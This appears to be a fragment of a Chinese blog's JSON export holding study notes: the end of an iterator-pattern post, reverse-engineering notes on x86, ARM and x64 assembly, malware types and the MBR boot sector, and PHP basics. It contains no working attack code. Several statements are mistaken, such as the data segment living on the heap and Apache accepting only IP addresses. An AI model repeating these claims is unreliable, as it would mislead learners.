迭代器简化了聚合类。由于引入了迭代器，在原有的聚合对象中不需要再自行提供数据遍历等方法，这样可以简化聚合类的设计。 在迭代器模式中，由于引入了抽象层，增加新的聚合类和迭代器类都很方便，无须修改原有代码，满足“开闭原则”的要求。 缺点： 由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。 抽象迭代器的设计难度较大，需要充分考虑到系统将来的扩展，例如JDK内置迭代器Iterator就无法实现逆向遍历，如果需要实现逆向遍历，只能通过其子类ListIterator等来实现，而ListIterator迭代器无法用于操作Set类型的聚合对象。在自定义迭代器时，创建一个考虑全面的抽象迭代器并不是件很容易的事情。","link":"/2022/04/21/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"title":"逆向工程学习笔记","text":"摘要：本文记录了学习逆向工程的过程 一.前置知识1.什么是逆向1234一般的编译：高级语言-&gt;汇编-&gt;机器码逆向：机器码-&gt;汇编-&gt;源代码(高级语言)从源代码理解开发者行为与目的狭义的逆向：利用工具对源代码及二进制文件进行逆向分析 2.逆向流程拿到程序-&gt;die看有没有壳，有的话脱壳-&gt;静态或动态分析 3.其他PE和ELFPE（Portable Executable）意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE格式文件，即Windows操作系统上的程序文件（可能是间接被执行，如DLL） ELF（Executable and Linkable Format）意为可执行与可链接格式，一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件，是UNIX系统实验室（USL）作为应用程序二进制接口（Application Binary Interface，ABI）而开发和发布的，也是Linux的主要可执行文件格式。 x86和x64的区别x86中只有8个32位通用寄存器，eax,ebx,ecx，edx, ebp, esp, esi, edi。x86_64把这8个通用寄存器扩展成了64位的，并且比x86增加了若干个寄存器（增加了8个，变成了总共16个通用寄存器） AT&amp;T和IntelAT&amp;T 语法，源在目标之前，而在英特尔语法中，目标在源之前 函数调用 我们将常量标签的内存地址移动到 edi 中，并将立即数 25 decimal 移动到数组的第二个索引中。这本质上是一个源代码破解，因为我们将原始值 8 更改为 25。 注意，一个数组的元素占据4个字节，地址+4 加壳即真正的源代码被加密了，执行时先执行一段植入的代码对原始代码进行解密，然后才执行源代码 二、从零开始学逆向x861.恶意软件的类型后门是一种将自身嵌入到计算机中的恶意代码，允许远程攻击者在很少或有时没有权限的情况下访问任何相应的本地计算机上的各种命令。 僵尸网络:攻击者通过各种途径传播僵尸程序感染互联网上的大量主机，而被感染的主机将通过一个控制信道接收攻击者的指令，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。僵尸网络为 DDoS 攻击提供了所需的“火力”带宽和计算机以及管理攻击所需的基础架构。“控制服务器（Control Server）”是指控制和通信的中心服务器 下载器(downloader):是恶意代码，其目的只有一个，即安装其他恶意软件。当黑客最初获得对系统的访问权限时，经常会安装下载器。然后下载器安装额外的软件来控制系统 信息访问恶意软件:从计算机收集信息并将其直接发送到主机，例如键盘记录器或密码抓取器，通常用于获取对可能非常敏感的各种在线帐户的访问权限 Rootkit:向用户隐藏自身的存在和其他恶意软件，使其极难定位。可以操纵进程，例如在 IP 扫描中隐藏其 IP，这样用户可能永远不会知道他们拥有连接到僵尸网络或其他远程计算机的直接套接字。 蠕虫：它会自我复制并追踪其他计算机。 2.x86 程序集介绍关注 32 位架构，因为最终大多数恶意软件都将为此编写，以便感染尽可能多的系统。32 位应用程序/恶意软件将在 64 位系统上运行。 专注于 Linux 和基于控制台的编程，因为大多数专业服务器都使用 Linux，因此是恶意软件的最大威胁。 3.十六进制数系统我们在二进制中了解到每个数字代表一个位。如果我们组合 8 位，我们得到一个字节。一个字节可以进一步细分为高 4 位和低 4 位。由于 4 位为您提供了从 0 到 15 的可能范围，因此基数为 16 的数字系统更易于使用。 在 x86 汇编中，用十六进制表示二进制数字表示比在任何其他数字系统中都容易得多。重要的是要了解每个十六进制数都是 4 位长或称为半字节 十六进制的加法如下。从这一点开始，所有十六进制数字将在数字旁边有一个“h”： 4.字节、字、双字一个字节是 8 位。两个字节称为一个字，两个字称为一个双字，它是四个字节（32 位），一个四字是八个字节（64 位）。 一个字节是 8 位。大小为 8 位的二进制数的数量是从 0 开始到 255 的 256 个值之一。0xffffd040 是 4 个字节并且是一个双字。(每个十六进制数字都是 4 位长) 5.x86 基本架构 CPU由4部分组成： 获取指令：32 位 CPU 首先从内存中的特定地址获取一个双字，然后从内存中读取并加载到 CPU 中。此时，CPU 查看双字中的二进制位模式，并开始执行获取的机器指令指示它执行的过程。 在执行完一条指令后，CPU 会进入内存并按顺序取出下一条机器指令。CPU 有一个寄存器，称为 EIP 或指令指针，它包含要从内存中获取并执行的下一条指令的地址 如果我们控制 EIP 的流程，我们可以改变程序来做它不打算做的事情。这是恶意软件运行的一种流行技术。 6.通用寄存器通用寄存器可用于保存任何类型的数据，这些数据在程序中已获得特定用途 12345678EAX : 算术计算中使用的主寄存器。也称为累加器，因为它保存算术运算的结果和函数返回值。EBX：基址寄存器。指向 DS 段中数据的指针。用于存放程序的基地址。ECX：计数器寄存器通常用于保存一个值，该值表示一个进程要重复的次数。用于循环和字符串操作。EDX：通用寄存器。另外用于 I/O 操作。此外将 EAX 扩展到 64 位。ESI：源索引寄存器。指向 DS 寄存器所指向的段中的数据的指针。用作字符串和数组操作中的偏移地址。它保存从哪里读取数据的地址。EDI：目标索引寄存器。指向由 ES 寄存器指向的段中的数据（或目标）的指针。用作字符串和数组操作中的偏移地址。它保存所有字符串操作的隐含写入地址。EBP：基指针。指向堆栈上数据的指针（在 SS 段中）。它指向当前堆栈帧的底部。它用于引用局部变量。ESP：堆栈指针（在 SS 段中）。它指向当前堆栈帧的顶部。它用于引用局部变量。 EAX、EBX、ECX 和 EDX 寄存器的低 2 个字节中的每一个都可以由 AX 引用，然后按名称细分为 AH、BH、CH 和 DH 用于高字节，AL、BL、CL 和 DL 用于低字节每个 1 个字节。此外，ESI、EDI、EBP 和 ESP 可以通过它们的 16 位等效项来引用，即 SI、DI、BP、SP。 7.段寄存器123456CS：代码段寄存器存储用于数据访问的代码段（.text 段）的基本位置。DS：数据段寄存器存储用于数据访问的变量（.data 部分）的默认位置。ES：在字符串操作期间使用的额外段寄存器。SS：堆栈段寄存器存储堆栈段的基址，在隐式使用堆栈指针或显式使用基址指针时使用。FS：额外段寄存器。GS：额外的段寄存器。 每个段寄存器都是 16 位的，包含指向内存特定段开始的指针。CS 寄存器包含指向内存中代码段的指针。代码段是指令代码存储在内存中的位置。处理器根据 CS 寄存器值和指令指针 (EIP)寄存器中包含的偏移值从内存中检索指令代码。请记住，没有程序可以显式加载或更改 CS 寄存器。当程序被分配一个内存空间时，处理器分配它的值。 DS、ES、FS 和 GS 段寄存器都是用来指向数据段的。四个单独的数据段中的每一个都帮助程序分离数据元素，以确保它们不重叠。程序使用段的适当指针值加载数据段寄存器，然后使用偏移值引用各个内存位置。 段寄存器被认为是操作系统的一部分，几乎在所有情况下都不能直接读取或更改。在保护模式平面模型（32 位的 x86 架构）中工作时，您的程序运行并接收 4GB 地址空间，任何 32 位寄存器都可以潜在地寻址 40 亿个内存位置中的任何一个，但定义的那些受保护区域除外 物理内存可能大于 4GB，但是 32 位寄存器只能表示 4,294,967,296 个不同的位置。如果您的计算机中有超过 4GB 的内存，则操作系统必须在内存中安排一个 4GB 区域 8.EIP寄存器默认情况时,gdb和gcc输出的汇编都是AT&amp;T格式的,但是它们都有方式转换为Intel格式 9.指令代码处理 在最左边，我们有相应的内存地址。在中间我们有操作码，最后在右边我们有相应的英特尔语法汇编语言。 检查内存地址80483de，我们在其中看到操作码b8 00 00 00 00。我们可以看到b8操作码对应右边的mov eax, 0x0指令。下一系列 00 00 00 00 代表值 0 的 4 个字节。我们看到mov eax, 0x0因此将 0 的值移动到 eax 中，因此代表上面的代码。请记住，IA-32 平台使用我们所谓的小端表示法。 假设有一个int类型的变量，位于地址0x200处，它的十六进制值为0x1234567812是最高有效位，78是最低有效位 小端表示法： 120x200 0x201 0x202 0x20378 56 34 12 10.如何编译程序.c-&gt;.s(汇编语言源代码)-&gt;.o(二进制对象文件)-&gt;链接器生成二进制可执行文件 11.内核空间与用户空间在 Linux 中，有两个不同的内存区域。在任何程序执行的内存的最底部，我们都有内核空间，它由调度程序部分和向量表组成。 在任何程序执行的内存的最顶端，我们都有用户空间，它由堆栈、堆和最后的代码组成 12.寄存器寻址[bx+idata] 13.cmov条件传送指令12cmp %rsi, %rdicmova %rdx, %rax 如果RSI寄存器中的值大于RDI寄存器中的值，则把RAX寄存器中的值替换为RDX寄存器中的值。(at&amp;t) ARM321.二进制加减法 2.字长这是我们的第一个字： 12345670x000000000x000000040x000000080x0000000Cstr, r9, [r4] @ 将 r9 的内容存储到 r4 中的位置，如果 r9 有 0x02 十六进制， 0x02 将被存储到位置 r4 3.寄存器 4.CPSR寄存器(当前程序状态寄存器)该寄存器共有 32 位。我们最关心的最高 4 个是： 1234位 31 – N = 负标志位 30 – Z = 零标志位 29 – C = 进位标志（无符号操作）位 28 – V = 溢出标志（签名操作） 5.链接寄存器链接寄存器 R14 用于保存函数调用的返回地址。 当 BL（带链接的分支）指令执行子程序调用时，链接寄存器设置为子程序返回地址。BL 跳转到代码中的另一个位置，完成后允许返回到 BL 代码部分之后的点。当子程序返回时，链接寄存器将地址返回给程序计数器。 链接寄存器不需要对包含堆栈的内存进行读写操作，通过重复调用小子程序可以节省相当多的执行时间。 当 BL 执行后，返回地址，即下一条要执行的指令的地址，被加载到 LR 或 R14链接寄存器 中。当子例程完成时，LR 被直接复制到 PC（程序计数器）或 R15 并且代码继续执行它在顺序代码源中的先前位置。 6.ARM 固件引导过程第一次打开 Raspberry Pi 设备时会发生什么。 一旦 Pi 通电，图形处理器就会首先运行，因为处理器处于复位状态，GPU 开始执行代码。ROM 从 SD 卡读取并读取bootcode.bin，然后将其加载到 C2 缓存中的内存中，然后打开 RAM 的其余部分，然后再加载start.elf 。 start.elf是图形处理器的操作系统，它读取您可以修改的config.txt 。然后kernel.img被加载到内存中的0x8000中，这是 Linux 内核。 加载后，kernel.img打开 CPU 并开始在内存中的0x8000处运行。 如果需要，我们可以创建自己的kernel.img，我们可以将机器代码硬编码到文件中并替换原始映像，然后重新启动。请记住，ARM 字长为 32 位，从位 0 到 31,如编写以下内容： 1FE FF FF EA 当 Pi 启动时，以下代码在到达kernel.img时会加载以下内容： 12345FE FF FF EA@ 地址 0x8000, 0xfe 被加载。@ 地址 0x8001, 0xff 被加载。@ 地址 0x8002, 0xff 被加载。@ 地址 0x8003, 0xea 被加载。 1234567上面的代码有 3 个部分：(小端输入法从右往左读)1）有条件的 - 设置为始终2）操作码 - 分支3）偏移量——在当前位置内移动多远条件 – 位 31-28：0xe 或 1110操作码 – 位 27-24：0xa 或 1010偏移量 - 位 23-0 -2 7.冯诺依曼架构这种架构的 CPU 芯片包含一个控制单元和算术逻辑单元（以及一些本地存储器） ARM 是一种加载和存储机器，算术逻辑单元仅对寄存器本身和任何需要存储到 RAM 的数据进行操作，控制单元在内存和共享同一数据总线的寄存器之间移动数据。 8.加减法ADDS 与 ADD 相同，只是它在 CPSR 中相应地设置标志。 我们将 100十进制加到r1中，将4,294,967,295加到r2中。然后我们将 r1和r2添加到r0 中。 我们看到10 hex的CPSR。二进制中的10 hex是00010000。0001意味着： 1234未设置负标志零标志未设置进位标志未设置溢出标志集 注意：上面的代码中没有设置溢出标志的任何内容，但是在执行此二进制文件时它处于自然状态(1)。我们看到64 十六进制或100 十进制按预期移动到r1中。CPSR没有变化。加法r0中的值是十进制100和十进制4294967295加在一起后的十进制99 。这怎么可能？加法中溢出了r0的 32 位寄存器。如果我们检查CPSR，我们现在会看到20000010 hex或0010 0000 0000 0000 0000 0000 0001 0000 binary。我们只需要关注最重要的位0010 1234未设置负标志零标志未设置进位标志设置//执行adds后从0001-&gt;0010溢出标志未设置 设置了进位标志并且没有设置溢出标志。这是为什么？ 进位标志是两个无符号数相加并且结果大于保存它的寄存器时设置的标志。我们正在处理一个 32 位寄存器。我们也在处理无符号数，因此设置了CF并且OF未设置，因为OF​​ 标志处理的是有符号数。 砰！我们破解了它，看到r0是101，因此没有触发进位标志，并将CPSR保持在0x10 十六进制，这意味着0001 二进制 注意：有符号运算表示范围：$-2^{n-1} 到 2^{n-1}-1$无符号运算表示范围：$0 到 2^{n}-1$ ADC 与 ADD 相同，只是如果设置了进位标志(即此时CPSR的第29位为1)，结果会加 1。所以当我们使用 ADC 时，我们需要特别注意 CPSR 或状态寄存器。 好的，所以我们在r3和r4中将100 个十进制数和100 个十进制数相加，我们在r5中得到201个十进制数！有什么东西坏了吗？ADC 与 ADD 相同，只是之前adds r0,r1,r2使得进位标志被设置，所以我们在r5中得到了额外的 1 。 ARM中的减法有四个指令，分别是SUB、SBC、RSB和RSC。当您在每个末尾添加 S 后缀时，例如 SUBS、SBCS、RSBS、RSCS，它会影响标志。 9.编译原理编译过程是将 C++ 代码翻译成机器代码的地方。编译将我们的文本文件获取为 cpp 文件并将其转换为称为 obj 文件的中间格式(二进制生成文件)。创建一个抽象语法树，它是常量数据、变量和指令的转换。创建树后，将生成代码。这意味着我们现在有了 ARM CPU 将执行的机器代码。每个 cpp 文件（翻译单元）都将有自己的相应 obj 文件与之关联。 编译之后是链接生成二进制可执行文件，除了 C++ 标准库之外，链接还需要我们的 obj 文件、我们的编译文件，并找到每个符号和函数的位置，并将它们全部链接到一个可执行文件中。 x641.调用约定__fastcall 调用约定指定函数的参数将在可能的情况下在寄存器中传递。符号 (@) 是名称的前缀；参数列表中后跟字节数（十进制）的@符号作为名称的后缀。 如果您有五个要传递的参数，例如 int a， int b， int c， int d， int e并且它是一个 WORD 长度，a将进入cx，b进入dx，c进入r8w，d进入 r9w 和e 入栈。 2.指针123mov rax, 0x10 //rax = 0x10mov rbx, word ptr [rax] //rbx = *rax ,获取地址所引用的对象时mov word ptr [rax], 0x66 //*(0x10) = 0x66 假设内存0x10内的值是0x20 ，因此rax指向0x10内的值，当您通过[rax]引用时，rbx值为0x20。将0x66的值放入0x10的内存位置。原来0x10内存位置内的值是0x20，因此内存内 0x10 处的新值将是0x66。 1lea rbx, my_var //rbx = &amp;(my_var),rbx是一个地址 3.加载有效地址在 C++ 中，一个指针实际上添加了用户在某些内容增加时会看到的内容，但是它实际上是在引擎盖下将其向前移动 2 个字节，假设它是一个字长或 16 位或 2 个字节。一样。 在汇编中，每个字节都是可寻址的。例如： 123lea rax, my_varinc raxmov word ptr [rax], rbx 假设0x20的值在rbx中。上述指令会将0x20的值放入非字边界，这将导致错误。您必须将rax增加 2 以确保不会发生这种情况。 4.数据段数据段在内存中的堆而不是堆栈上分配内存，因为它们不是局部变量，它们在整个二进制文件中都是已知的。 1234567891)byte - 我们使用显然是 1 字节或 8 位的 db 表示法。2)word - 我们使用 dw，长度为 2 个字节。3）双字 - 我们使用 dd 来分配，它们有 4 个字节长。4）四字 - 我们使用 8 字节长的 dq。5)xmm word - 我们使用 16 字节长的 xmmword。6)ymm word - 我们使用 32 字节长的 ymmword。有一些与 CPU 分开的 SSE 数学寄存器，它们保存以下内容：1)real4 - 这是一个单数或您认为的浮点数，因为它有 4 个字节长。2)real8 - 这是一个双浮点，因为它有 8 个字节长。 5.SHL,SHR,ROL,ROR指令6.汇编的编译 123mov ax,0x0001mov bx,0x0002add ax,bx ;result is in ax 注意小端表示法 机器会自动选择较优的指令(即占用字节空间较小的) 因为d位(默认)是0即r/m是目标操作数ax。 汇编代码编译成机器码，注意汇编指令和CPU机器指令不完全对应，因为汇编语言有很多伪指令(比如一条指令机器会拆分成几个步骤)。伪指令是编译器定义的，是编译器对机器指令的封装 7.计算机的启动过程CPU随着时钟信号，从内存中读取指令 按下电源键时，电源给主板供电，CPU会收到一个复位信号，大部分寄存器清零，但代码段寄存器CS会被初始化为0xFFFF,同时指令指针寄存器IP初始化为0x0000。实模式下CPU的寻址方式是把CS的值左移4位即0xFFFF0,再加上IP的值，构成一个20位的物理地址0xFFFF0,这个地址指向主板上的一块特殊的芯片(BIOS芯片)BIOS(基础输入输出系统),是一段固化在芯片中的程序。CPU初始化后执行的第一条指令就来自这里。功能主要是对硬件进行诊断和检测，如判断主板上是否安装了内存条、硬盘、显卡等，并初始化这些设备，当检测到重要设备缺失时，BIOS程序将在屏幕上显示提示信息。(蜂鸣器也会根据不同错误发出声音)检测正常后BIOS最后做的是从外部存储设备读取更多的指令交给CPU执行(如硬盘等) 8.引导扇区BIOS从硬盘上的主引导扇区加载一段程序到内存的固定位置交给CPU执行，操作系统就是由这段程序加载进内存里形成指令的(如安装操作系统的硬盘、U盘、光盘等)，加载成功就形成了windows开机界面啦 我们要做的就是在计算机启动的过程中找一个位置把我们自己的程序塞进去让CPU执行。启动过程中CPU首先执行BIOS程序(主板出厂时已经固化好了，我们很难修改它)，然后就是位于硬盘的主引导扇区了，硬盘的数据我们是可以修改的。如果我们把自己的程序放进主引导扇区再由bios载入内存，就可以执行了。这也是在不用操作系统的情况下让我们的程序运行起来的唯一方法。 主引导扇区位于硬盘什么位置呢？传统的机械硬盘由盘片、磁头和硬盘驱动器组成。盘片用涂有磁介质的铝合金组成，比采用塑料介质的软盘硬很多，所以叫硬盘。盘片被安装在高速转机上旋转(笔记本会慢些)，磁头负责在盘面上读写信息。 每个磁道又被划分为多个扇区，每个扇区通常是512个字节(4096),一个磁道通常划分为63个扇区，扇区是硬盘上组织数据的最小单位，因为内圈磁道周长比外圈小，但划分的扇区数和每个扇区的字节数都一样，所以外圈磁道的扇区存储数据的密度比内圈扇区低 为了在盘片上定位数据，磁道和扇区有编号 硬盘的横截面：一个硬盘由多个盘片组成，盘片的上下两面都有一个磁头，这些磁头固定在同一个轴上，所以磁头号和盘面号是一个意思。磁头在写入数据时并不是把一个盘片的一个面写满再去写下个面的，因为移动磁头来切换磁道的速度比读写的速度慢得多。硬盘是先写满0面的0磁道，再写1面的0磁道，这样纵向地组织数据的。所以不同盘面的相同磁道可以抽象地看成是一个柱面。 如果我们知道一段数据在硬盘上的柱面号、扇区号和磁头号，就可以在硬盘上定位到这段数据。这就是硬盘的CHS寻址方式 9.主引导记录(Master Boot Record,MBR)主引导扇区是位于硬盘的0柱(0道)、0面、1扇区的512字节存储空间，而MBR则为我们要写入的这512个字节的数据。而这512个字节是有严格的格式规范的。1个地址代表1个字节的数据 注意：标志位55AA必不可少，因为不是所有硬盘的0柱0面1扇区都是用来作为主引导扇区的，只有以55AA结尾的BIOS程序才会把主引导扇区的数据识别为MBR载入内存 10.VHD虚拟硬盘VHD是微软定义的一种虚拟硬盘文件。 LBA(逻辑区块寻址，Logical Block Address):CHS寻址方式比较麻烦，而且出现了固态硬盘，根本不存在柱面磁头和扇区 对于固定大小的VHD文件分成两个部分：数据区和尾部。数据区的结构和物理磁盘相同，即数据区扇区和虚拟硬盘扇区顺序映射。所以VHD虚拟硬盘的主引导扇区就是文件的头512字节。我们只需把写好的程序放入VHD文件的头512个字节即可。 参考资料","link":"/2022/04/19/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"php学习","text":"摘要：本文记录php学习过程 前置知识在浏览器中输入网址到返回页面的过程输入url回车，会先访问配置好的DNS服务器地址查找域名对应的IP，如果能查到DNS服务器就把要找的IP地址发回来，如果查不到就到根域名服务器。根域名服务器(很少)记录了哪些服务器是负责查.com，哪些是.xyz等等，再让我们去对应的服务器依次向下询问，问到了就把IP返回浏览器Apache服务器只接受IP访问，不接受域名访问，所以需要DNS 1234apache服务器：安装了apache软件的电脑dns服务器：安装了dns软件的电脑mysql服务器：安装了mysql的电脑IIS、nginx 一、安装环境win10虚拟机phpstudy集成了apache,php,mysql,phpmyadmin,zend,使用教程 12WAMP:Windows+apache+mysql+php LAMP则是Linux端口可省略，默认是80(http) 动态页面：内容会定期更新 web服务器是软件(apache,IIS,nginx)每一个网页伺服器程式都需要从网络接受HTTP请求，然后提供HTTP回复给请求者浏览器只能执行三种前端，无法执行php文件，会无视php内容静态页面内容是不变的，扩展名是html，这种你浏览器请求的话，不经过服务器处理，服务器就直接传给你了；动态页面的内容是根据条件变化的，可能每个人看到的都不一样，动态页面里的代码是服务器处理过后才传给浏览器的。那么服务器怎么知道这个文件该不该处理之后再传呢？最简单的办法就是根据扩展名区分，服务器遇见.php的后缀就会先处理再发给浏览器。php页面也可以包括html内容，如果.php文件都是html内容，那么相当于php处理器打开文件看了下，没啥处理的就直接丢给浏览器了。如果请求的是.html，apache默认不会发给php应用服务器 如果本机没有运行环境，php文件是运行不了的。如果把扩展名改成.html或者.htm后，直接点击就可以打开，但是其中php代码是不会执行和显示的。php应用服务器(软件)执行php代码并把结果返回apache 二、php语法1.基本语法?&gt;结束标志隐含了一个分号，所以有时最后一行可以不加分号 2.变量使用变量之前是不需要声明的变量的销毁 1234unset($变量名称)$and1=1;unset($and1);//销毁$and变量echo $and1;//提示出错，因为变量已经被销毁了！ 可变变量 123$abc='test';//定义了一个变量$abc里面存了值test$$abc='孙胜利';//$test='孙胜利';echo $test; 引用 12345$a='test';$b=$a;//相当于把$a的值，复制一份再赋值给$b这个变量$b=&amp;$a;//相当于给$a起了一个别名，操作其中任何一个，都会影响到另外一个变量的值!$b=20;echo $a; 变量类型(弱类型语言)bool 12345678以下值被认为是false，其他的值都是被认为是true ①布尔值false ②0 ③浮点型0.0 ④空白字符串和字符串0//空白字符串指的是直接一对单引号或者双引号里面没有任何内容 ⑤没有成员的数组 ⑥NULLvar_dump输出变量类型 int(100) NULLnull表示一个变量没有值，表示空，如被unset函数销毁的变量string (字符串) 12345678910$b=100;$a='test$bdwqd\\'wqdqw';//test$bdwqd'wqdqw,转义\\$a='te$bst......';//te$bst......$a=&quot;te{$b}st......&quot;;//te100st......echo $a;//定界符$b=200;$a=&lt;&lt;&lt;aaa字符串内容aaa;//aaa与变量命名规则类似 3.常量定义：define(‘常量名称’,常量值) 或者 define(“常量名称”,常量值)defined()函数来检查是否定义了某个常量常量一旦被定义就不能被重新定义或者取消定义********常量可以不用理会变量范围的规则而在任何地方定义和使用(预定义常量) 4.预定义常量PHP内核已经帮我们定义好了的常量其中有的预定义常量是以__开头的，这些预定义常量我们又叫它魔术常量(代码所在的位置不同他的值也是不同的，所以它叫魔术常量)预定义常量是不区分大小写的！ 5.运算符字符串运算符 1234567. 连接运算符$a='孙胜利';$b='测试字符串连接符';$c = $a.$b;echo $c;echo '&lt;br /&gt;';echo &quot;{$a}{$b}&quot;; 赋值运算符$a=$b=2;相当于$a=($b=2);也相当于$a=2;$b=2;比较运算符PHP中规定：使用echo输出布尔类型值的时候 12echo true;它在页面中会输出1echo false;它会在页面中什么都不输出 在测试的过程中如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更明了的结果&lt;&gt;和!=是一样的如$a!=$b即$a&lt;&gt;$b逻辑运算符 1234567891011and 或者 &amp;&amp;xor!//逻辑非 如!$a表达式1 ? 表达式2 : 表达式3;$a=false ? 10 : 20;//20 $a=false整个表达式值是false//赋值运算符整个语句是有值的，所以整个语句就是一个表达式，只要是值就是表达式//如echo $a=$b=2;//2`可以把系统的命令放在里面执行！`$a=`ipconfig`;//string(1412) $b=`ifconfig`;var_dump($b);//windows系统无输出 屏蔽表达式@ 1234屏蔽表达式可能发生错误！$b = 1;unset($b);var_dump(@$b);//NULL 6.流程控制if、switch、while、for、exit()、die()、 7.函数12345function 函数名([形式参数1,形式参数2,....形式参数n]){ //各种PHP代码.... //...... return 表达式;//也可以不返回，如果不写那么默认返回null} 参数传递 形参 引用传参 可变长度参数列表：调用时比形参多是允许的123func_get_args();func_get_arg();func_num_args(); 可变函数(变量函数)12345function test(){ echo &quot;test&quot;;}$a = 'test';$a();//等价于test(); 8.数组数组创建12345678方法一、 变量名称[索引值]=数据; 变量名称[]=数据;//不写索引值默认是 索引数组，从0开始方法二、 变量名称=array( 索引值=&gt;数据, .......... ); 多维数组：12345$students = array( 0=&gt;array(1,'sun',true,60.5), 1=&gt;array(2,'li',false,20), 2=&gt;array(3,'han',true,90)) 数组的遍历for循环(用的比较少，因为有缺陷)1234$arr=array( 'name'=&gt;'sun', 'age'=&gt;10) foreach:12345678910111213141516foreach(数组变量 as 变量1){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据}foreach($arr as $value){ echo $value;} foreach(数组变量 as 变量1=&gt;变量2){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据的索引值 变量2代表当前正在经历（访问）的数据}foreach($arr as $key=&gt;$value){ echo $key.'&lt;br/&gt;';} 预定义超全局数组变量已经定义好了（存在）的变量(存放的数据的类型是数组)传递数据（提交数据）给服务器端主要两种方式123456789101.get方式 比如： ?参数名=参数值&amp;参数名=参数值...... http://localhost/demo5_3/index.php?参数名=参数值 在服务器端（请求的php文件这边）可以通过$_GET来获取到 $_GET索引值为参数名，索引值对应的数据就是参数值2.post方式 比如表单 post发送过来的！ 可以通过$_POST来获取到!3.$_REQUEST 既可以接收 get 请求数据,也可以接收 post 请求 9.字符串处理去除空格或其他字符函数12345678910111.trim//去除左右两边 $str=' abc '; var_dump($str); var_dump(trim($str)); $str='abcabcdefac'; var_dump($str); var_dump(trim($str,'bac'));//如果要去除多个字符可以连着写！2.ltrim3.rtrim 大小写转换函数12strtoupper($str);strtolower($str); 字符串查找函数123456789101112131415161718192021222324251.substr_count $str='testteste'; var_dump(substr_count($str,'te'));//3 $text2 = 'gcdgcdgcd'; echo substr_count($text2, 'gcdgcd');//1 $str='testteste'; var_dump(substr_count($str,'te',1,8));//不能超出字符串2.strpos $str='testteste'; var_dump(strpos($str, 't1')); if(strpos($str, 't')===false){ echo '没找到！'; }else{ echo '找到啦!'; } $str='testteste'; var_dump(strpos($str, 't',1));//从str[1]开始找，直到str[3]，返回33.strstr $str='testteste'; var_dump($str); var_dump(strstr($str,'s')); var_dump(strstr($str,'s',true)); 字符串替换函数12345678910str_replace$str=array( 'abc123abc', '123abcabc', 'abcab123c' );var_dump($str);$str1=str_replace(array('1','2','3'),array('一','二','三'),$str,$count);echo $count;//count = 9;有九个字符被替换了var_dump($str1); 字符串截取函数12$str='testdqwdwqdwqdqdwq';echo substr($str,3,2); 字符串分隔函数1234561.explode $str='test,test1,test2,test3'; var_dump(explode(',',$str,2));//从第一个,分成两部分2.str_split $str='test'; var_dump(str_split($str,1));//分割后的每部分只含1个字符 10.正则表达式正则表达式就是普通字符和特殊字符组成的一个字符串描述了一类字符串的特征，然后通过这个特征可以配合一些特定的函数，来完成对字符串更加复杂的一系列操作！定界符 /a/,/表示正则表达式的开始与结束 还有#a# !a! |a|等普通字符元字符1234567891011121314151617181920212223242526\\d 匹配任意一个十进制数字，等价于[0-9]\\D 匹配任意一个除十进制数字以外字符,等价于[^0-9]\\s 匹配任意一个空白字符,比如换页符、换行符、回车符、制表符、垂直制表符\\S 匹配除空白字符以外的任何一个字符\\w 匹配任意一个数字或字母或下划线\\W 匹配除数字、字母、下划线以外的任意一个字符. 匹配除换行符以外的任意一个字符* 匹配0次或1次或多次其前面的字符+ 匹配1次或多次其前面的字符? 匹配0次或1次其前面的字符{n} 表示其前面字符恰好出现n次{n,} 表示其前面字符出现不少于n次{n,m} 表示其前面的字符至少出现n次，最多出现m次^或\\A 匹配字符串开始位置$或者\\Z 匹配字符串的结束位置| 匹配两个或多个模式[] 匹配方括号中的任意一个字符[^] 匹配除方括号中字符以外的任意一个字符() 将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可以使用 \\\\数字 来代表圆括号部分所匹配到的内容！ 模式修正符 常见模式修正符 i 在和模式进行匹配时不区分大小写 m 多行匹配，如果目标字符串 中没有”\\n”字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响 s 如果设定了此修正符，那么.将匹配所有的字符包括换行符 U 禁止贪婪匹配函数：12preg_matchpreg_match_all($p,$s,$arr[])//给定正则表达式，在给定的字符串中搜索，符合特征的部分就提取出来 11.文件与目录操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748一、判断普通文件和目录 1.is_file()//判断给定文件名是否为一个正常的文件 2.is_dir()//判断给定文件名是否是一个目录二、文件的属性 1.file_exists()//检查文件或目录是否存在 2.filesize()//取得普通文件大小 3.is_readable()//判断给定文件名是否可读 4.is_writable()//判断给定的文件名是否可写 5.filectime()//获取文件的创建时间 6.filemtime()//获取文件的修改时间 7.fileatime()//取得文件的上次访问时间 8.stat()//获取文件大部分属性值三、目录的基本操作 1.basename()//返回路径中的文件名部分 2.dirname()//返回路径中的目录部分 3.pathinfo()//返回文件路径的信息 4.opendir()//打开目录句柄 5.readdir()//从目录句柄中读取条目,返回目录中下一个文件的文件名 6.rewinddir()//倒回目录句柄 7.closedir()//关闭目录句柄 8.mkdir()//新建目录 9.rmdir()//删除指定的空目录 10.scandir()//列出指定路径中的文件和目录四、文件的基本操作 1.fopen()//打开文件或者 URL 2.fread()//读取文件 3.fgets()//从文件指针中读取一行 4.feof()//测试文件指针是否到了文件结束的位置 5.fwrite()//写入文件 6.rewind()//倒回文件指针的位置 7.flock()//轻便的咨询文件锁定 8.ftruncate()//将文件截断到给定的长度 9.fclose()//关闭一个已打开的文件指针 10.file() //把整个文件读入一个数组中 11.copy()//拷贝文件 12.unlink()//删除文件 13.file_get_contents()//将整个文件读入一个字符串 14.file_put_contents()//将字符串写入文件中 15.rename()//重命名一个文件或目录 16.readfile()//读入一个文件并写入到输出缓冲五、文件的上传 文件的上传的过程这些细节我们是不需要管的，都是自动的，上传的文件默认是放在一个临时的目录里面的，我们要做的就是把这些临时目录 里面的文件移动到我们需要的地方就OK啦！六、文件的下载 获取文件的MIME类型 